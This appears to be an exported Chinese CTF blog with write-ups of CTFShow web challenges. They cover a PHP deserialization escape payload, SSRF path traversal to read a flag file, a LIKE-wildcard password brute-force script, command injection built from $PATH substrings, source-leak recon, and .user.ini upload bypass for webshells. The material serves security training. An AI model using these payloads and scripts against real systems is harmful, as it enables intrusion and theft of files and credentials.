<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://123.206.31.85:10020/&quot;</span></span><br><span class="line">s=requests.session()     </span><br><span class="line"> <span class="comment">#session对象是会话过程中，服务器用来记录特定用户会话信息的，它能够帮我们跨请求保持某些参数</span></span><br><span class="line">r=s.get(url)               </span><br><span class="line"><span class="comment">#构造一个向服务器请求资源的url对象，在这里获取url链接</span></span><br><span class="line">a=re.findall(<span class="string">&quot;[0-9a-z]+&quot;</span>,r.content.decode(<span class="string">&quot;utf-8&quot;</span>))  </span><br><span class="line"><span class="comment">#返回r中与[0-9a-z]+相匹配的全部字符串，返回形式为数组;这里的.content是读取源文件字节流，随后将该字节流编码为Unicode编码</span></span><br><span class="line">a=<span class="built_in">str</span>(a[<span class="number">0</span>])   </span><br><span class="line"><span class="comment">#re.findall提取出的信息是列表存储的，[0]即是将列表中的第一个数据从列表中提出来。</span></span><br><span class="line">u=url+<span class="string">&quot;?key=&quot;</span>+a   </span><br><span class="line"> <span class="comment">#在url窗口的提交格式</span></span><br><span class="line">r=s.get(url=u)       </span><br><span class="line"> <span class="comment">#get提交</span></span><br><span class="line">print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>))   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>脚本多跑几遍，就可以得到flag</p>
<p>后来看了大佬的WP，发现动态密文的值是md5(时间戳+1)+一位随机数值</p>
<p>然后写脚本的时候加<code>for i in range(1,10):</code>,可以少跑几次,修改后的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):      <span class="comment">#可以把range(1,10)这里的10改大点，这一一次直接跑出来的机率大点哈</span></span><br><span class="line">    url=<span class="string">&quot;http://123.206.31.85:10020/&quot;</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    r=s.get(url)</span><br><span class="line">    a=re.findall(<span class="string">&quot;[0-9a-z]+&quot;</span>,r.content.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    a=<span class="built_in">str</span>(a[<span class="number">0</span>])</span><br><span class="line">    u=url+<span class="string">&quot;?key=&quot;</span>+a</span><br><span class="line">    r=s.get(url=u)</span><br><span class="line">    print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow月饼杯</title>
    <url>/2020/09/28/CTFShow%E6%9C%88%E9%A5%BC%E6%9D%AF/</url>
    <content><![CDATA[<p>CTFShow月饼杯,学到了很多<a id="more"></a></p>
<h1 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h1><p>题目描述：一江春水何年尽，万古清光此夜圆</p>
<p>挺简单的一题，考察反序列化字符逃逸</p>
<p>附下解题脚本，过程就不写了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>=<span class="string">&#x27;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//    public function __construct($uname,$password)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;uname=$uname;</span></span><br><span class="line"><span class="comment">//        $this-&gt;password=$password;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>=filter(serialize(<span class="keyword">new</span> a(<span class="variable">$uname</span>,<span class="variable">$password</span>)));</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:5:&quot;</span>yu22x<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>


<h1 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h1><p>题目描述：三五夜中新月色，二千里外故人心</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span>[<span class="number">1</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$a</span>) <span class="keyword">and</span> strlen(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span> = (<span class="variable">$b</span>==hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>)) &amp;&amp; (<span class="variable">$c</span>==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$d</span>)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var(<span class="variable">$url</span>[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                <span class="variable">$host</span>=parse_url(<span class="variable">$url</span>[<span class="number">1</span>]);</span><br><span class="line">                print_r(<span class="variable">$host</span>); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;差点点就成功了！&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;想一想md5碰撞原理吧?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第一个都过不了还想要flag呀?!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag in /fl0g.txt&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><strong>第一关 绕过a</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">需要绕过 is_numeric(<span class="variable">$a</span>) <span class="keyword">and</span> strlen(<span class="variable">$a</span>)&lt;7 <span class="keyword">and</span> <span class="variable">$a</span>!=0 <span class="keyword">and</span> <span class="variable">$a</span>*<span class="number">*2</span>==0</span><br></pre></td></tr></table></figure>
<p>php小数点后超过161位做平方运算时会被截断,我们可以用科学计数法来代替，即 <code>1e-162 </code></p>
<p><img src="https://img.npfs06.top/20210405212700.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里的三个 if语句都可以执行成功，可以自己尝试下</p>
<p><strong>第二关 绕过b c</strong></p>
<p>有个提示，按提示写脚本即可，做法类似 MD5爆破</p>
<p><img src="https://img.npfs06.top/20210405212716.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405212727.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>第三关 url</strong></p>
<p>考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p>
<ul>
<li>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href="https://www.runoob.com/php/filter-validate-url.html" target="_blank">https://www.runoob.com/php/filter-validate-url.html</a></li>
</ul>
<p>题目中要求url中存在 ctfshow.com,又要构造符合url格式<br>我们可以构造类似 a://ctfshow.com/../../../  这样的url，又因为我们需要查看fl0g.txt文件</p>
<p>最终payload为 url=a://ctfshow.com/../../../../../fl0g.txt</p>
<h1 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h1><p>题目描述：皎洁一年惟此夜，莫教容易负婵娟</p>
<p>查看源码，可以发现一些提示</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">like 模糊匹配</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span> 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 <span class="comment">([a-f])</span> 或集合 <span class="comment">([abcdef])</span> 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 <span class="comment">([a-f])</span> 或集合 <span class="comment">([abcdef])</span> 的任何单个字符</span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">？同于DOS命令中的？通配符，代表单个字符</span><br><span class="line"><span class="attr"># 大致同上，不同的是代只能代表单个数字</span></span><br></pre></td></tr></table></figure>
<p>这里的话大部分字符都被过滤了，但是_(下划线)没有，添加N个 _ (下划线）可以知道密码长度为32</p>
<p><img src="https://img.npfs06.top/20210405212740.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://b1390a07-2ecc-422e-a3e5-0c80c4d66024.chall.ctf.show/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;i = &#x27;</span>+str(i+<span class="number">1</span>),end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j in a:</span><br><span class="line">        password = pwd + j + (<span class="number">31</span> - i) * <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:password&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> not in r.text:</span><br><span class="line">             pwd += j</span><br><span class="line">             <span class="keyword">print</span>(pwd)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>密码：67815b0c009ee970fe4014abaa3Fa6A0 ；用户名：yu22x  </p>
<p>bp抓包 爆破，发现小写字母全被过滤了<br>但是可以使用：大写字母，数字，{ }，空格，$，~</p>
<p>题目有个hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">环境变量 +linux字符串截取 + 通配符</span><br></pre></td></tr></table></figure>
<p>先放payload：ip=0;${PATH:14:1}${PATH:5:1}  ????.???</p>
<p>做法：<strong>使用$PATH环境变量来截取字母</strong></p>
<p><img src="https://img.npfs06.top/20210405212759.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405212807.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>需要读取 flag.txt</p>
<p>但是我在本地的$PATH路径上找不到 t  ….</p>
<p>所以用 nl</p>
<p><img src="https://img.npfs06.top/20210405212817.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>查看源码即可得到flag</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_信息收集</title>
    <url>/2020/10/10/CTFshow-web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>CTFshow web入门之信息收集篇</p>
<a id="more"></a>

<p><img src="http://img.npfs06.top/1999159-20201031182159184-2133244042.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">右键</span><br><span class="line">查看源码得到<span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Ctrl+U或者 view-source:http:<span class="regexp">//</span>网站/ 查看源码得到flag</span><br></pre></td></tr></table></figure>
<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>响应头获取flag</p>
<p>拿burpsuite抓包看响应头，或者之间谷歌F12   network看响应头</p>
<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>访问 robots.txt     <strong><a href="http://url/robots.txt">http://url/robots.txt</a></strong></p>
<p>有个/flagishere.txt目录，访问下得到flag       <strong><a href="http://url/flagishere.txt">http://url/flagishere.txt</a></strong></p>
<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><strong>注：web5 –web10 考察点均为源码泄露，可参考文章    <a href="https://www.cnblogs.com/NPFS/p/12746349.html" target="_blanket">源码泄露</a></strong></p>
<p>题目提示 phps源码泄露有时候能帮上忙</p>
<p>直接访问 index.phps</p>
<p>得到源码，就能看到flag</p>
<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>拿dirsearch目录扫描，扫到<a href="http://www.zip,访问得到压缩包/">www.zip，访问得到压缩包</a></p>
<p>在index.php中提示 flag in fl000g.txt   ，但是我们在flooog.txt 无法发现正确flag</p>
<p>正确做法是在页面中访问fl000g.txt   ,得到flag        <strong><a href="http://url/fl000g.txt">http://url/fl000g.txt</a></strong></p>
<h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>dirsearch扫描</p>
<p><img src="http://img.npfs06.top/1999159-20200903230827601-1559053931.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>发现/.git/泄露，访问下就得到flag了</p>
<h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>考察点   svn泄露</p>
<p>做法同上，访问 <strong><a href="http://url/.svn">http://url/.svn</a></strong>页面直接得到flag</p>
<h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p>考察点：  vim 临时文件泄露</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">程序员使用vim编辑器编写一个`index.php`文件时，会有一个`.index.php.swp`文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的`.swp`文件，而是会生成一个新的，例如`.swo`文件。</span><br></pre></td></tr></table></figure>
<p>做法同上 ，访问<strong><a href="http://url/index.php.swp">http://url/index.php.swp</a></strong>,下载文件，得到flag</p>
<h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>flag在cookie那</p>
<p><img src="http://img.npfs06.top/1999159-20200903231734977-350417039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p>
<p><img src="http://img.npfs06.top/20210223150506.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><p>dirsearch扫描，后台登录，需要账号密码</p>
<p><img src="http://img.npfs06.top/20210223150522.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>账号：admin   </p>
<p>密码的话，结合题目提示：有时候网站上的公开信息，就是管理员常用密码</p>
<p>很容易找到密码</p>
<p><img src="http://img.npfs06.top/20210223150600.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>登入即可得到flag</p>
<h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><p><img src="http://img.npfs06.top/20210223150622.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>document文件翻到最下面，就有后台地址和登入账号密码，登入即可得到flag</p>
<p><img src="http://img.npfs06.top/20210223150635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><p>后台目录扫描，有个/editor</p>
<p>url访问，胡乱按几个按钮，每到要输入URL的地方，就会有个谜一样的链接提示</p>
<p><img src="http://img.npfs06.top/20210223150656.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>访问后：</p>
<p><img src="http://img.npfs06.top/20210223150710.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64两次解密，得到的是一个错误的flag。。。。</p>
<p>正确做法：</p>
<p><img src="http://img.npfs06.top/20210223150726.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>点这个文件空间，可以得到所有目录</p>
<p>flag在 var/www/html/nothinghere/fl000g.txt</p>
<p>url 访问 /nothinghere/fl000g.txt 得到flag</p>
<h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><p>还是一样，扫描目录，登录后台  /admin</p>
<p>用户名admin   ，选择忘记密码</p>
<p><img src="http://img.npfs06.top/20210223150739.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>西安，得到修改后的密码，登入即可得到flag</p>
<h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><p>既然题目提示了探针，那就访问下 tz.php 看下，看下PHP参数</p>
<p><img src="http://img.npfs06.top/20210223150750.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>点下如图PHPINFO，跳转到phpinfo页面，搜索得到flag</p>
<h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><p><img src="http://img.npfs06.top/20210223150807.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p>查看源码，访问下Js文件</p>
<p><img src="http://img.npfs06.top/20210223150853.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>访问110.php  </p>
<p>得到flag</p>
<h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure>
<p>抓包修改下password值为a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04，即可得到flag</p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag </p>
<p><img src="http://img.npfs06.top/20210223150908.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>&lt;——–本文完——–&gt;</p>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>CTFshow_web入门_文件上传</title>
    <url>/2021/03/08/CTFshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>CTFshow_web入门_文件上传<a id="more"></a></p>
<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>fuzz之后，发现可以上传png格式的图片，文件上传，burp suite抓包，改后缀为php，蚁剑连接即可</p>
<p><img src="https://img.npfs06.top/20210308090026.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同web151</p>
<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>本题考察利用上传user.ini进行文件上传绕过。对于user.ini直接献上官方文档。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">自 PHP <span class="number">5.3</span>.<span class="number">0</span> 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 <span class="selector-class">.htaccess</span> 文件有同样效果。</span><br><span class="line"></span><br><span class="line">除了主 php<span class="selector-class">.ini</span> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER<span class="selector-attr">[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]</span> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line"></span><br><span class="line">在 <span class="selector-class">.user</span><span class="selector-class">.ini</span> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</span><br></pre></td></tr></table></figure>
<p>也就是说如果你目录下有user.ini会先去识别里面的配置。当然文档也说了，并不是所有的配置都可以识别。只有 PHP_INI_PERDIR 和 PHP_INI_USER 模式可以。</p>
<p><img src="https://img.npfs06.top/20210308092243.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>那么我们就去找我们需要用到配置<br>发现auto_append_file和auto_prepend_file<br>一个相当于在每个php文件尾加上 include(“xxxx”)，一个相当于文件头加上 include(“xxx”)<br>其中xxx就是 auto_append_file的值。</p>
